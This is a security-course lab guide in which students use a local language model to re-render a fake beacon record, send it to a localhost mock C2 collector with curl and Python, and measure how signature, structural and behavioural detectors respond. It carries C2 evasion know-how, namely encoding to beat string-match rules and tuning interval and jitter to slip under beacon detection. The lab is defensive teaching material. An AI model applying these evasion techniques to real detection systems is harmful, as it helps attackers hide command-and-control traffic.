# Lab 7 — AI-powered attack orchestration

**Time:** 12–15 minutes · You write no code.

Lines marked 🅱️ are the **core attack commands**. Beginner mode runs only those.
Expert mode runs the whole list.

---

## Before you start

> **First lab? Not set up yet?**
> Go to **[the setup guide](../../docs/student-setup.md)** first. It covers getting the
> course files, installing Docker, and the extra steps Windows needs. Come back here when
> `docker --version` works.

If you have already done labs 1 to 6, you are ready — nothing new to install. Like labs 5
and 6, this lab adds **no new software at all**: it reuses the same language model labs 3
to 6 already put on your machine.

---

## How the lab works — read this once

Every step is a small experiment, and it always has the same three beats:

**1. Why** — one or two lines telling you what you are about to do and what to watch for.

**2. The command** — you type or paste it. The lab checks what you typed before it runs
anything. Get it wrong and it shows you the right command; get it wrong twice and it runs
the correct one for you.

**3. What it meant** — lines beginning with `^` underneath the output, on the steps where
something just changed.

> **The `^` lines are the point of the lab.** The output shows you *what happened*; the `^`
> lines tell you *why it matters*. If you read one thing, read those.

### The output will run off your screen. Nothing is lost.

Some steps print more than a screenful. That is expected, and there are three reasons not
to worry about it:

- **The lab never moves on by itself.** It waits at every step until you type something.
  Read first, type second. The 12–15 minutes assumes you are reading.
- **You can scroll back at any time.** The mouse wheel works everywhere. macOS Terminal and
  most Linux terminals also take `Shift`+`PageUp`; Windows Terminal takes
  `Ctrl`+`Shift`+`PageUp`. Scrolling does not interrupt the lab.
- **The whole transcript is saved to a file**, including every `^` line. When the lab
  finishes it is copied out to `lab7-results.txt`, next to the setup script you ran. If
  something scrolled past, open that file afterwards rather than hunting for it in the
  terminal — and it is the same file you use as evidence.

---

## Run the lab

Open a terminal **in the course folder** — the `Ai-OFF-and-DEF` folder you cloned, wherever
you put it. Not sure you are in it? `dir` on Windows, `ls` on macOS and Linux: you should
see a `labs` folder.

**Windows** — PowerShell, opened **as Administrator** (Start menu → type `powershell` →
right-click → **Run as administrator**):

```bash
cd $HOME\Documents\Ai-OFF-and-DEF
```

```bash
powershell -ExecutionPolicy Bypass -File .\labs\lab7\setup\setup.ps1
```

The first line assumes you cloned into your Documents. If you cloned somewhere else, `cd`
there instead — the second line is relative to the course folder, so it works from any
location.

**macOS and Linux**

```bash
bash labs/lab7/setup/setup.sh
```

This lab runs a small collector process alongside it — but it lives inside the container,
it binds `127.0.0.1` only, and **no port is published to your machine**. Once the image is
on your machine the lab runs with no network at all.

When it finishes, the script copies your transcript out to `lab7-results.txt`, next to the
setup script. That file is your evidence.

### One step takes about a minute

One of the eight commands runs a language model on your own CPU, five times. It takes
roughly a minute, and up to five on an older laptop. **That is the lab working, not the lab
hanging.** The other seven commands are instant.

### Choose a mode

**Beginner** — the default, and the right choice if you are not sure. The lab shows each
command with a short explanation of what it does and why. You type or paste it, and the lab
checks it before anything runs. Get it wrong and it tells you what the command should have
been; get it wrong twice and it runs the correct one for you. Eight commands.

**Expert** — drops you into a real shell in the lab folder. No commands shown, no
corrections. You work from [`LAB.md`](LAB.md). Expert also adds the steps beginner skips:
running the collector as **its own process** and sending a check-in by hand with `curl` so
you can see that the defender's entire view of this incident is one append-only log file;
editing `schedule.txt` with `nano` to choose **your own** interval and jitter and hunt for
the *fastest* setting that still comes out clean; asking for a format that was **measured to
fail** on this model; and reading `detect.py`, which is the only defensive code in the lab.
Finish with `python check.py`.

To go straight to expert mode, add `--expert` to the command above.

**If it fails**, the script tells you why in plain English. Send that message to the
instructor through GitHub.

---

## The question this lab answers

An LLM can rewrite your beacon a hundred ways in a minute. **What does that actually buy
you?**

In labs 3 to 6 the model was the victim. Here it is *your* tool and you are the attacker.

---

## Architecture

Everything is inside the container, on `127.0.0.1`, with no network.

```
   record.txt   "agent_id=LAB-BEACON-7742, host=WKSTN-14, user=jhalloran, …"
        │       one line. It never changes. Only its rendering does.
        │
        ├──────────────────────────────┐
        ▼                              ▼
   ┌─────────────────────┐   ┌──────────────────────┐
   │  variants.py        │   │  variants.py         │
   │  --formats          │   │  --encode            │
   │                     │   │                      │
   │  Qwen2.5-1.5B       │   │  base64.b64encode()  │
   │  local, CPU, temp 0 │   │  .hex()              │
   │  5 renderings, ~35s │   │  2 lines, instant    │
   └─────────────────────┘   └──────────────────────┘
        │                              │
        └──────────────┬───────────────┘
                       ▼
              ┌──────────────────┐
              │  collector.py    │   the mock "C2"
              │  127.0.0.1:8007  │   appends and answers 200. Not published.
              └──────────────────┘
                       │
                 collector.log  ◄── the ONLY thing the detectors read
                       │
      ┌────────────────┼─────────────────┐
      ▼                ▼                 ▼
   D1 signature   D2 structural    D3 behavioural
   one string     decode, split,   cadence + volume
   match          count values     reads NO payload
```

**The detectors never see `variants.json`.** A defender does not get the attacker's working
files, only what arrived.

---

## The vulnerable configuration

The vulnerability here is **not in a model and not in an application.** It is in a detection
rule, and it is the most common one there is:

```python
if "LAB-BEACON-7742".lower() in body.lower():
    alert()
```

One string. It keys on how the data *looks* rather than on what the data *is*. Anything that
changes the rendering beats it — including two lines of Python that need no AI at all.

---

## Mapping

**MITRE ATLAS leads this lab, and OWASP comes second.** That is a deliberate break from labs
1 to 6, and the reason is worth one sentence: OWASP's Top 10 for LLM Applications describes
risks in software *you build*. An attacker using an LLM to help them work is a fact about the
threat landscape, not a vulnerability in your application — so this is the one lab in the
course whose topic sits outside it. Forcing a fit would teach you a false idea of what the
Top 10 is for.

**MITRE ATLAS** (v5.6.0): **`AML.T0016.002` Obtain Capabilities: Generative AI** →
`AML.T0043.003` Craft Adversarial Data: Manual Modification → **`AML.T0015` Evade AI Model**.

`AML.T0016.002` describes what you are about to do, in its own words: *"obtain generative AI
models or tools, such as large language models, to assist them in various steps of their
operation… serve them locally using frameworks such as Ollama or vLLM."*

**Two real case studies, not hypotheticals:**

- **`AML.CS0000`** — Palo Alto Networks tested a deep-learning detector for malware C2
  traffic, then crafted evasion samples by removing header fields not used for C2. **The
  crafted packets were identified as benign with over 80 % confidence.** That is step 4 of
  this lab with the names changed.
- **`AML.CS0044`** — **LAMEHUG** (APT28, 2025, CERT-UA#16039) called the **Qwen 2.5 Coder
  32B Instruct** model to generate its commands on infected hosts. You are about to use the
  same model family, three sizes down. Note what it used the LLM *for*: command **text**.
  Not encoding. Step 2 explains why.

**OWASP `LLM10:2026` Improper Output Handling**, Scenario #2 — *"the LLM can **encode** the
sensitive data and send it, without any output validation or filtering, to an
attacker-controlled server."* And `LLM02:2026` via OWASP's own ATLAS cross-map: *"Base64 and
hex encodings defeat regex and blocklist data-loss filters."* Step 4 measures exactly that.

---

## Every command in the lab

🅱️ marks the core commands. Beginner mode runs only those.

```
🅱️  python variants.py --formats json,csv,kv,xml,urlq     ask the MODEL for 5 renderings
🅱️  python variants.py --encode base64,hex                2 lines of Python, no model
🅱️  python beacon.py --all                                send them to the collector
🅱️  python detect.py --signature                          D1: one string match
🅱️  python detect.py --structural                         D2: ignores the format entirely
🅱️  python detect.py --behaviour                          D3: reads no payload at all
🅱️  python detect.py --behaviour --interval 7200 --jitter 0.95     get under it
🅱️  python evidence.py                                    what it bought, what it cost
    cd /labs/lab7                                         expert: start here
    cat record.txt                                        what you are trying to move
    python variants.py --show                             the variant table
    python collector.py &                                 run the collector yourself
    curl -s -X POST --data-binary @record.txt \
         -H 'X-Lab-Variant: byhand' http://127.0.0.1:8007/checkin
    cat collector.log                                     the defender's whole view
    nano schedule.txt                                     YOUR interval and jitter
    python variants.py --formats ini                      a format measured to FAIL
    cat detect.py                                         the only defensive code here
    python check.py                                       confirm the evidence is real
```

---

## Evidence to submit

`python evidence.py` prints three numbers: **what the model produced, what the signature rule
missed, and the slowdown it took to go clean.** Paste those three into the class chat or
GitHub. The full transcript is in `lab7-results.txt`.

---

## The number to leave with

Varying the surface of your data is cheap, and it beats rules that key on the surface. It
does **nothing** to a rule that keys on the record — a twenty-line detector caught every
variant in this lab, including the two the AI could not produce.

The detector that actually cost you something never read your payload at all. Getting under
it took the beacon from 60 records an hour to 0.75: **80× slower**, and 500 records went from
8 hours to 28 days.

One detector dimension is nearly free to beat. **Two orthogonal ones are a bill, and the
defender sets the price.**

---

## One thing this lab deliberately does NOT contain

There is no loop that tests variants against the detector and refines until one passes.
That is an offensive tool no matter how harmless the payload is, and it is the one thing
this lab was explicitly built without. You set two numbers by hand, twice, and read the
bill.

The collector is also on `127.0.0.1` rather than on a real domain, and that is not
squeamishness. This lab is *about* beaconing on a timer. A work laptop that runs a hacking
lab and then makes periodic timed check-ins to an unfamiliar external host is the textbook
EDR detection — step 7 would be tuning the interval of a real one. Step 3 prints what a real
operator's endpoint would have received and stops there.

---

## If this interested you

- **[RITA](https://github.com/activecm/rita)** is the real version of D3, and ActiveCM's free
  **[beacon threat-hunting lab](https://activecm.github.io/threat-hunting-labs/beacons/)** is
  the defender's side of this exercise done properly, with real PCAP.
- **[PyRIT](https://github.com/microsoft/PyRIT)** is Microsoft AI Red Team's version of
  step 1 — base64, ROT13, leetspeak, homoglyph, Unicode confusables.
- **[garak](https://github.com/NVIDIA/garak)**'s `av_spam_scanning` probe is where
  `LAB-BEACON-7742` comes from conceptually: it tests for **EICAR**, **GTUBE** and
  **GTPHISH**, the standard harmless signatures that exist so detectors can be proven to fire
  without anyone handling real malware.

---

## Reference

ATLAS technique and mitigation IDs in this lab are cited **as of ATLAS release 2026.09**.
The authoritative, always-current definitions are at
<https://atlas.mitre.org/>, and the underlying data is at
<https://github.com/mitre-atlas/atlas-data>.

OWASP GenAI LLM Top 10 (2026): <https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/>
